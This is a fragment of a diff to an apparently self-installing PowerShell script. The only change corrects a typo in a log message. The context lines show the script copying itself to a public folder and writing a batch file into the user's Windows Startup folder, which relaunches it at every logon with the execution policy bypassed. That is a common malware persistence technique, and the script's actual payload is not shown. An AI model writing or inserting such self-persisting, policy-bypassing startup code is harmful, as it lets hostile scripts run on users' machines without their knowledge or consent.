@@ -46,7 +46,7 @@ $ps1_file = "C:\Users\Public\jeleel_yeah.ps1"
 $MyInvocation.MyCommand.ScriptContents | Out-File $ps1_file
 
 #create start bat
-Write-Host "Writing jeleel_start.bet"
+Write-Host "Writing jeleel_start.bat"
 $bat_file = "$Home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jeleel_start.bat"
 $bat_contents = "powershell.exe -ExecutionPolicy Bypass -Command C:\Users\Public\jeleel_yeah.ps1"
 $bat_contents | out-file $bat_file
